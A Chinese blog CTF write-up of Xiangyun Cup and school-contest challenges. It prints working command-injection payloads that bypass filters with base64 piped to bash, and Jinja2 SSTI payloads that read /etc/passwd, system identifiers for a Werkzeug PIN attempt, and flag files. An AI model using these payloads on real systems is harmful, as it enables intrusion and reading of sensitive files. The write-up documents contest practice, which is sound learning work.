+<h2 id="还是原来的-Ping-？"><a href="#还是原来的-Ping-？" class="headerlink" title="还是原来的 Ping ？"></a>还是原来的 Ping ？</h2><p>网上稍微查查可以发现<code>ping</code>的命令绕过，这就是个命令绕过题</p>
+<p>先试试输入<code>127.0.0.1|ls</code></p>
+<p><img src="https://i.loli.net/2020/11/22/Q3tycqhxMoAHJ4Z.png" alt></p>
+<p>有回显</p>
+<p>接着试错过滤字符，<code>&lt;space&gt;</code>、<code>&amp;</code>、<code>&gt;</code>、<code>cat</code>、<code>&#39;</code>、<code>flag</code>等等被过滤了，但是<code>&quot;</code>、<code>%</code>、<code>\</code>并没有被过滤</p>
+<p>那就构造<code>127.0.0.1|ca&quot;t&quot;&lt;./sou.js</code></p>
+<p>有回显</p>
+<p>接下来需要寻找<code>flag</code>，基本命令就是</p>
+<pre><code>find / -name &quot;*flag*&quot;
+</code></pre><p>空格可以用<code>%09</code>进行绕过（<code>{}</code>也被过滤了，无法使用<code>{IFS}</code>），比较难解决的就是<code>flag</code>了，在<code>flag</code>掺杂<code>&quot;</code>、<code>/</code>、<code>\</code>均无法绕过，看来不是单纯的字符检测，那就使用<code>base64</code>试试</p>
+<p>将上面的基本命令用<code>base64</code>加密得<code>ZmluZCAvIC1uYW1lICIqZmxhZyoi</code></p>
+<p>构造如下<code>payload</code>进行尝试</p>
+<pre><code>127.0.0.1|echo%09ZmluZCAvIC1uYW1lICIqZmxhZyoi|base64%09-d|bas\h
+</code></pre><p>基本原理就是利用管道符<code>|</code>将<code>echo</code>命令的值传给<code>base64</code>命令，<code>base64</code>对base64内容解密并传给<code>bash</code>命令</p>
+<blockquote>
+<p>可以说我就是在这里卡住了，因为没有任何输出信息<br>后来朋友提示了我说把<code>payload</code>放到<code>url</code>输入试试，结果惊奇发现有了回显，才反应过来浏览器自动对特殊字符进行了<code>url</code>编码，而<code>linux</code>并不会自动将<code>%25</code>自动替换成<code>%</code>或者将<code>%7C</code>自动替换成<code>|</code>之类的，这就导致了无回显</p>
+</blockquote>
+<p>回显如下（我手动对齐了一下）</p>
+<pre><code>Result:/sys/devices/platform/serial8250/tty/ttyS0/flags
+/sys/devices/platform/serial8250/tty/ttyS1/flags
+/sys/devices/pci0000:00/0000:00:03.0/virtio0/net/eth0/flags
+/sys/devices/virtual/net/lo/flags
+/sys/devices/virtual/net/dummy0/flags
+/sys/module/scsi_mod/parameters/default_dev_flags
+/usr/lib/perl/5.18.2/bits/waitflags.ph
+/etc/.findflag
+/etc/.findflag/flag.txt
+/proc/sys/kernel/sched_domain/cpu0/domain0/flags
+/proc/sys/kernel/sched_domain/cpu1/domain0/flags
+/proc/kpageflags
+</code></pre><p><code>/etc/.findflag/flag.txt</code>便是<code>flag</code>所在位置了，先记下来</p>
+<p>既然对<code>flag</code>过滤了，那么接下来<code>cat</code>也需要使用<code>base64</code>进行构造</p>
+<p>执行命令为</p>
+<pre><code>ca\t /etc/.findf\lag/f\lag.txt
+</code></pre><p><code>base64</code>加密得<code>Y2FcdCAvZXRjLy5maW5kZlxsYWcvZlxsYWcudHh0</code></p>
+<p>最终<code>payload</code>为</p>
+<pre><code>127.0.0.1|echo%09Y2FcdCAvZXRjLy5maW5kZlxsYWcvZlxsYWcudHh0|base64%09-d|bas\h
+</code></pre><p>取得<code>flag</code></p>
+<pre><code>Result:flag{9f1a16d4-5f5c-4104-8e18-6c73621531ef} 
+</code></pre><h2 id="flaskbot"><a href="#flaskbot" class="headerlink" title="flaskbot"></a>flaskbot</h2><p>这是一道<code>SSTI</code>题</p>
+<blockquote>
+<p>SSTI: Server-Side Template Injection</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/22/FcEyoiag4tLQHZ7.jpg" alt></p>
+<p>试着输入<code>username</code>: iyume</p>
+<p><img src="https://i.loli.net/2020/11/22/AlV4NgpGeWSmRJb.jpg" alt></p>
+<p>试着输入<code>num</code>: 777</p>
+<p>会出来一个 html 纯文本页面</p>
+<pre><code>1:500000000.0 is too large
+2:250000000.0 is too large
+3:125000000.0 is too large
+4:62500000.0 is too large
+5:31250000.0 is too large
+6:15625000.0 is too large
+7:7812500.0 is too large
+8:3906250.0 is too large
+9:1953125.0 is too large
+10:976562.5 is too large
+11:488281.25 is too large
+12:244140.625 is too large
+13:122070.3125 is too large
+14:61035.15625 is too large
+15:30517.578125 is too large
+16:15258.7890625 is too large
+17:7629.39453125 is too large
+18:3814.69726562 is too large
+19:1907.34863281 is too large
+20:953.674316406 is too large
+21:476.837158203 is too small
+22:715.255737305 is too small
+23:834.465026855 is too large
+24:774.86038208 is too small
+25:804.662704468 is too large
+26:789.761543274 is too large
+27:782.310962677 is too large
+28:778.585672379 is too large
+29:776.723027229 is too small
+30:777.654349804 is too large
+31:777.188688517 is too large
+32:776.955857873 is too small
+33:777.072273195 is too large
+34:777.014065534 is too large
+35:776.984961703 is too small
+36:776.999513619 is too small
+37:777.006789576 is too large
+38:777.003151597 is too large
+39:777.001332608 is too large
+40:777.000423113 is too large
+41:776.999968366 is too small
+42:777.00019574 is too large
+43:777.000082053 is too large
+44:777.000025209 is too large
+45:776.999996788 is too small
+45:776.999996788 is close enough
+I win
+</code></pre><p>二分法逼近，数字肯定无法胜利，寻找别的方法</p>
+<p>首先是信息搜集，利用<code>debugger</code>的栈查看上下文，尝试<code>input num type error</code>、<code>404</code>、<code>username error</code>，分别出现三个报错页面，如下图</p>
+<p><img src="https://i.loli.net/2020/11/22/nEYyPNcwakvSAp1.png" alt></p>
+<ul>
+<li>input num type error</li>
+</ul>
+<blockquote>
+<p>信息点：对输入的<code>username</code>进行了<code>base64</code>加密并储存在<code>cookie:user</code>内，然后访问的时候会取得<code>cookie:user</code>内的值进行解密并储存在<code>name</code>这个内部变量</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/22/rw9SfOjToihaI35.png" alt></p>
+<ul>
+<li>404</li>
+</ul>
+<blockquote>
+<p>信息点：有一个<code>render_template_string()</code>，极大可能是注入点，它的传参是使用<code>%s</code>获取的，因此可以注入模板，<code>guessNum()</code>应该就是猜数字的函数，传参为<code>num</code>和<code>name</code>，<code>name</code>就是在上一个信息点得知的<code>username</code>，但是显然他并没有打印出任何与<code>name</code>相关的东西，比如<code>iyume vs bot</code>之类的，有可能是在人胜利时才会输出</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/22/4RskbdwxZ81uiD5.png" alt></p>
+<ul>
+<li>username error</li>
+</ul>
+<blockquote>
+<p>信息点：有一个<code>render_template()</code>，但这个调用模板的函数并不像<code>render_template_string()</code>，它的传参是变量取值的形式，任何字符都无法注入，硬要说注入的话只可能是第一个参数（但一般没有人会去让用户控制网页名吧），因此这只能当作一个无用信息点</p>
+</blockquote>
+<p>根据第二点，试着把<code>cookie:user</code>改成比如<code>e3syKjd9fQ==</code>(base64decode=14)</p>
+<p><img src="https://i.loli.net/2020/11/23/b3ovG1DERkejutX.jpg" alt></p>
+<p>因为是<code>render_template()</code>输出的这个页面，<code>payload</code>的回显合乎情理</p>
+<p>另寻途径</p>
+<p><code>Python Numpy</code>中有一种空值类型<code>(float)NaN</code>，它与任何数进行任何比较都会返回<code>false</code>，那试着在数字框输入<code>NaN</code></p>
+<pre><code>1:500000000.0 is too small
+2:750000000.0 is too small
+...
+51:1000000000.0 is too small
+Wow! Damn you hacker! You will never win.
+</code></pre><p>看来这里是我赢了，但是可能<code>payload</code>中有特殊字符被过滤了</p>
+<p>把<code>cookie:user</code>的值换成<code>e3syfX0=</code>(decode=2)</p>
+<pre><code>Wow! 2 win.
+</code></pre><p>输出了我的胜利，并且<code>\{\{2\}\}</code>成功被渲染成了<code>2</code></p>
+<p><strong>至此，<code>SSTI</code>注入点确定</strong></p>
+<p>接下来有两种思路</p>
+<ul>
+<li>直接寻找<code>flag</code>并读取</li>
+<li>收集系统信息生成<code>pin</code>码<code>hack shell</code></li>
+</ul>
+<h3 id="Pin-码-Getshell"><a href="#Pin-码-Getshell" class="headerlink" title="Pin 码 Getshell"></a>Pin 码 Getshell</h3><blockquote>
+<p>先讲讲第二种，因为我没能成功</p>
+</blockquote>
+<ul>
+<li>生成<code>pin</code>所需系统信息（算法不贴了）<ol>
+<li>username</li>
+<li>modname</li>
+<li>app.__class__.’__name__‘</li>
+<li>app_path</li>
+<li>eth0_mac</li>
+<li>machine-id</li>
+</ol>
+</li>
+</ul>
+<p>在报错页面已经取得了信息<code>2</code>、<code>3</code>、<code>4</code></p>
+<p>基本构造</p>
+<pre><code>{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+</code></pre><p>成功得到回显</p>
+<pre><code>Wow! root:x:0:0:root:/root:/bin/ash bin:x:1......spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin win.
+</code></pre><p>信息<code>1</code>应该就是<code>guest</code>了</p>
+<p>接着构造</p>
+<pre><code>{{''.__class__.__mro__[2].__subclasses__()[40]('/sys/class/net/eth0/address').read()}}
+</code></pre><p>得到回显<code>00:16:3e:03:ee:c0</code></p>
+<p>在<code>python shell</code>执行<code>print(0x00163e03eec0)</code>即可获取信息<code>5</code></p>
+<p>接着构造</p>
+<pre><code>{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/machine-id').read()}}
+</code></pre><p>返回<code>debugger</code>提示<code>No Such file or dir</code>，又试了试<code>/var/lib/dbus/machine-id</code>，还是没有此文件，后来去列了一下目录，发现根本没有这个文件，看来是被动了手脚…以 <strong>失败</strong> 告终</p>
+<h3 id="直接寻找-flag"><a href="#直接寻找-flag" class="headerlink" title="直接寻找 flag"></a>直接寻找 flag</h3><p>构造</p>
+<pre><code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('/')}}
+</code></pre><p>被过滤了</p>
+<p>排查后发现被过滤的字符是<code>os</code>，那就替换成<code>&#39;o&#39;+&#39;s&#39;</code></p>
+<pre><code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['o'+'s'].listdir('/')}}
+</code></pre><p>成功得到回显</p>
+<pre><code>[&#39;proc&#39;, &#39;home&#39;, &#39;mnt&#39;, &#39;dev&#39;, &#39;srv&#39;, &#39;usr&#39;, &#39;sys&#39;, &#39;var&#39;, &#39;opt&#39;, &#39;bin&#39;, &#39;sbin&#39;, &#39;etc&#39;, &#39;run&#39;, &#39;media&#39;, &#39;tmp&#39;, &#39;root&#39;, &#39;lib&#39;, &#39;super_secret_flag.txt&#39;, &#39;app&#39;]
+</code></pre><p>显然<code>super_secret_flag.txt</code>就是 target 了</p>
+<p>但它也对<code>flag</code>进行了过滤</p>
+<p>那么构造如下<code>payload</code></p>
+<pre><code>{{''.__class__.__mro__[2].__subclasses__()[40]('/sup'+'er_se'+'cret_fl'+'ag.txt').read()}}
+</code></pre><p>得到回显</p>
+<pre><code>Wow! flag{4e713984-b085-412d-8b8b-c95bbf4f44b9} win.
+</code></pre><p><strong>成功取得<code>flag</code></strong></p>
+<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ul>
+<li>模板对<code>system</code>关键字进行了过滤，因此继承类<code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[71]</code>下调用<code>os.system</code>是没用的，目前没有绕过方案</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>祥云杯的水份还是挺高的，题目共有 31 道</p>
+<ul>
+<li>Misc 6</li>
+<li>Crypto 6</li>
+<li>PWN 6</li>
+<li>Reverse 7</li>
+<li>Web 6</li>
+</ul>
+<p>除了签到题，基本每道题都非常难，也非常有意思（</p>
+<p>Misc 有一道题目叫做<code>进制反转</code>，我的基本思路是<code>CRC 修复</code>然后解压文件进行二进制按位取反？正拿着<code>python</code>提取了<code>16进制</code>数据，又听大佬说<code>硬解 au 原始数据导入倒放 x.5 然后搜歌词</code>，我就停手了（菜死了</p>
+<p>比赛过程还学了一下<code>RSA</code>加密原理，虽然最后还是不会解题（</p>
+<p>对了，这个比赛的积分制度是<code>一血</code>（没有额外奖励）、以及<code>动态积分模式</code>（根据解出题目的队伍数减少相应的分值）</p>
+<p>关于组队，因为我也没加入协会（还没开始纳新），然后就个人参赛了。此外我们学校我所知的还有很多队伍，第一的那队解题数量<code>11</code>，排名好像是省内高校<code>14</code>，但省内高校出赛名额只有<code>3</code>个，所以我们学校也没有队伍晋级线下赛。</p>
+<p>至于我的排名，解题数量<code>4</code>，积分<code>179</code>，我只知道是校内第<code>5</code>，省内高校估计排到<code>80</code>多的样子</p>
+<p>校内赛的预赛已经过了，决赛形式是<code>CTF</code>+<code>AWD</code>，还没开始，因此做保留</p>
+<p>还想到别的什么再作补充</p>
+<h1 id="校赛"><a href="#校赛" class="headerlink" title="校赛"></a>校赛</h1><blockquote>
+<p>比赛时间：2020-12-06 9:00-11:30, 14:00-15:30<br>比赛形式：CTF + AWD</p>
+</blockquote>
+<p>其实只有 CTF 可以讲，AWD 完全不会玩。</p>
+<p>而且题目名称很多都忘了…就随便写了</p>
+<h2 id="Not-only-base64"><a href="#Not-only-base64" class="headerlink" title="Not only base64"></a>Not only base64</h2><p>7JJ3vECw1FBbqNxmQrcrd8toHvUiY</p>
+<p>听题目名字就知道这是 base 系的加解密</p>
+<p>目测没什么特征，一个一个试，最终是用 base58 解出来了</p>
+<pre><code>flag{n0t_on1y_base64}
+</code></pre><p>base58 很多人可能不知道这是什么，因为在日常生活确实不常见，但并不代表它用处不大，实际上比特币的钱包地址和私钥都是 base58 加密生成的。</p>
+<h2 id="Web-第二题"><a href="#Web-第二题" class="headerlink" title="Web 第二题"></a>Web 第二题</h2><p>就是一道基础题，直接 hackbar 都可以解决，没有环境不讲了</p>
+<h2 id="Web-第三题"><a href="#Web-第三题" class="headerlink" title="Web 第三题"></a>Web 第三题</h2><blockquote>
+<p>有时候阅读文档是一件很重要的事情</p>
+</blockquote>
+<p>由于出题人的锅，这题端口号给错了，导致我以为这是一道 0day，搞了好半天。后来比赛结束了直接就去问了出题人，他也是才发现端口给错了。不过后来用正确的端口号为我们讲解了一下题目。</p>
+<p>没有环境，我就随便说说算了。</p>
+<p>网页中提示我们去看文档，并且给了个 GET 参数，值是一个函数。提交这个参数会调用对应的函数。那就需要一个可以返回所有函数的函数，这时候去读文档，可以发现 get_defined_functions 这个函数可以满足需求，于是直接 GET，只返回了一个函数，就是获取 flag 的函数，再调用一次就拿到了 flag</p>
+<h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc 1"></a>Misc 1</h2><p>给了个 jpg 图片，查看属性-详细信息，描述里就写着 flag</p>
+<h2 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc 2"></a>Misc 2</h2><p>给了个 jpg 图片，直接点开发现是不支持的格式，直接改后缀 zip，里面有 50 张二维码图片，扫码试试得不到 flag，但是发现了一张体积异常的图片，解压出来查看属性-详细信息，得到 base64 字符串，解密得 flag</p>
+<h2 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc 3"></a>Misc 3</h2><h2 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc 4"></a>Misc 4</h2><p>这两题异曲同工，都是 zip 伪加密、高级伪加密，binwalk 一梭子解决。</p>
+<p>好吧，其实我不是这么解的。我的解法很蠢。</p>
+<p>用 010 Editor 打开 zip，把 Misc 3 的目录加密位、文件加密位改掉就可以直接打开了。把 Misc 4 的伪加密也全部去掉，但是并不能打开，直接手动提取 16 进制，把第二个文件 Tips.txt 解压了出来可以直接打开，但是第一个文件 flag.txt 还是有加密无法打开，后来发现是我漏了一处伪加密没有去掉。</p>
+<p>Tips.txt 写了字频统计，那就对 flag.txt 进行字频统计呗。这里其实最好使用自己的脚本，因为在线的大多不支持长字符串。</p>
+<p>Misc 5 同样也是伪加密，全部去掉解压，可以发现 flag.txt 里面写了一些描述，我记得有<code>86</code>、<code>QQMusic</code>、<code>给我一杯牛奶</code>之类的，是一道社工题，打开 QQ 音乐搜就是了，一般就是第 86 号里写的那个评论。</p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>想什么呢。我不会逆向，连 IDA 都没装。</p>
+<h2 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h2><p>为了准备 AWD 比赛，我甚至自己搭建了一个环境分享给学长一起来玩。</p>
+<p>地址：</p>
+<pre><code>https://github.com/mo-xiaoxi/AWD_CTF_Platform
+</code></pre><p>实际到比赛的时候，我也挺傻的，我在比赛结束前 10min 才发现每队的 root 账密就在大屏幕上写着，因为整个比赛就 1h30min，因为我太傻就基本都在划水…只能看着别的队伍拿分，还在想对方到底是怎么通过那个 Web 服务拿到 shell 的</p>
+<p>Web 服务有个注入漏洞，进入管理页面可以发现很明显的文件包含漏洞。不过发现的时候，已经比赛快结束了。</p>
+<p>以及，比赛服务器太弱鸡了，全场都没怎么快过。</p>
+
+        
+                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
+                    <p><strong>
+                         
+                            版权声明：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0 License</a>
+                        </strong>
+                        <br>
+                        <strong>本文链接：</strong><a href="http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html">http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html</a>
+                    </p>
+                </blockquote>
+        
+    
+
+    
+</div>
+
+
+            
+
+            <!-- Post Comments -->
+            
+            
+    <!-- 使用 DISQUS -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+<script type="text/ls-javascript" id="disqus-thread-script">
+    queue.offer(function() {
+            (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document;
+                var s = d.createElement('script');
+                s.src = '//peropero.disqus.com/embed.js';
+                s.setAttribute('data-timestamp', + new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        });
+</script>
+<script>
+    var dsqjs = new DisqusJS({
+        shortname: 'peropero',
+        siteName: 'blog.tinyume.com',
+        identifier: 'http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html',
+        url: 'http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html',
+        title: '祥云杯 校赛 Write-up',
+        api: '',
+        apikey: 'DLgNmYM1g1PtZTXyeqzaTemAIyFtcfPkIJEx8rZj8L7A6qjIPQ3V6rpFtkYk7X8q',
+        admin: 'iyume',
+        adminLabel: '管理员'
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+            
+        </div>
+
+        <!-- Post Prev & Next Nav -->
+        <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+        <a href="/archives/bom-de-jie-shao.html" id="post_nav-newer" class="prev-content">
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_back</i>
+            </button>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            新篇
+        </a>
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/archives/hackergame-2020-write-up.html" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+    </div>
+</div>
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/avatar.png" alt="黯梦萦辰's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        iyumelive@gmail.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <style>
+    .sidebar-iconfont {
+        display: block;
+        margin: 0px 0 -2px 2px;
+    }
+</style>
+<!--<p>theme.sidebar.homepage.icon</p>-->
+<ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+            <li>
+                <a href="mailto:iyumelive@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email Me">
+                    
+                    <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                    
+                    Email Me
+                </a>
+            </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+    <li id="sidebar-first-li">
+        <a href="/">
+            
+            <i class="material-icons sidebar-material-icons"><img src="https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/sidebar-home-0.svg" class="sidebar-iconfont"></i>
+            
+            &nbsp;主页
+        </a>
+    </li>
+    
+    
+
+    <!-- Archives  -->
+    
+    <li class="dropdown">
+        <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+            
+            <i class="material-icons sidebar-material-icons"><img src="https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/sidebar-archive-0.svg" class="sidebar-iconfont"></i>
+            
+            &nbsp;归档
+            <b class="caret"></b>
+        </a>
+        <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2021/04/">四月 2021<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2021/03/">三月 2021<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2021/02/">二月 2021<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2020/12/">十二月 2020<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2020/11/">十一月 2020<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2020/07/">七月 2020<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2020/04/">四月 2020<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2020/03/">三月 2020<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2020/02/">二月 2020<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2020/01/">一月 2020<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/11/">十一月 2019<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/10/">十月 2019<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/09/">九月 2019<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/07/">七月 2019<span class="sidebar_archives-count">1</span></a>
+        </ul>
+    </li>
+    
+    
+
+    <!-- Categories  -->
+    
+    <li class="dropdown">
+        <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+            
+            <i class="material-icons sidebar-material-icons"><img src="https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/sidebar-category-0.svg" class="sidebar-iconfont"></i>
+            
+            &nbsp;分类
+            <b class="caret"></b>
+        </a>
+        <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/categories/代码/">代码<span class="sidebar_archives-count">10</span></a></li><li><a class="sidebar_archives-link" href="/categories/日常/">日常<span class="sidebar_archives-count">10</span></a></li><li><a class="sidebar_archives-link" href="/categories/知识/">知识<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/随想/">随想<span class="sidebar_archives-count">2</span></a>
+        </ul>
+    </li>
+    
+    
+
+    <!-- Pages  -->
+    
+    <li>
+        <a href="/laycomment.html" title="留言">
+            
+            <i class="material-icons sidebar-material-icons"><img src=https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/laycomment-0.svg class=sidebar-iconfont></i>
+            
+            &nbsp;留言
+        </a>
+    </li>
+    
+    
+    <li>
+        <a href="/links" title="友链">
+            
+            <i class="material-icons sidebar-material-icons"><img src=https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/sidebar-friends-0.svg class=sidebar-iconfont></i>
+            
+            &nbsp;友链
+        </a>
+    </li>
+    
+    
+    <li>
+        <a href="/about" title="关于">
+            
+            <i class="material-icons sidebar-material-icons"><img src=https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/sidebar-person-0.svg class=sidebar-iconfont></i>
+            
+            &nbsp;关于
+        </a>
+    </li>
+    
+    <li class="divider"></li>
+    
+    
+    <li>
+        <a href="/timeline" title="时间线">
+            
+            &nbsp;时间线
+        </a>
+    </li>
+    
+    
+    <li>
+        <a href="/kami" title="神之领域">
+            
+            &nbsp;神之领域
+        </a>
+    </li>
+    
+    
+
+    <!-- Article Number  -->
+    
+    <li>
+        <a href="#">
+            文章总数
+            <span class="sidebar-badge">22</span>
+        </a>
+    </li>
+    
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+    <div class="sidebar-divider"></div>
+
+
+<!-- Theme Material -->
+
+    <a href="https://github.com/viosey/hexo-theme-material"  rel='external nofollow' class="sidebar-footer-text-a" target="_blank">
+        <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
+            主题 - Material
+            <span class="sidebar-badge badge-circle">i</span>
+        </div>
+    </a>
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+    <!-- Paradox Footer Left Section -->
+    <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+        <a href="https://twitter.com/furiyume" rel="external nofollow noreferrer" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
+                <span class="visuallyhidden">Twitter</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Facebook -->
+    
+
+    <!-- Google + -->
+    
+
+    <!-- Weibo -->
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+        <a href="https://github.com/iyume" rel="external nofollow noreferrer" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+        <a href="https://t.me/iyumoe" rel="external nofollow noreferrer" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-telegram">
+                <span class="visuallyhidden">Telegram</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- V2EX -->
+    
+
+    <!-- Segmentfault -->
+    
+</div>
+
+
+    <!--Copyright-->
+    <div id="copyright">
+        Copyright&nbsp;©&nbsp;<span year></span>&nbsp;黯梦萦辰
+        
+        <br>
+        
+        <a href="https://github.com/iyume/hexo-blog/tree/gh-pages" rel="external nofollow noreferrer">Github</a> & <a href="https://www.jsdelivr.com/" rel="external nofollow noreferrer">jsDelivr</a> & <a href="https://www.cloudflare.com/" rel="external nofollow noreferrer">Cloudflare</a> | <a href="http://beian.miit.gov.cn/" rel="external nofollow noreferrer">粤ICP备2020138189号</a>
+        
+        <br>
+        <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
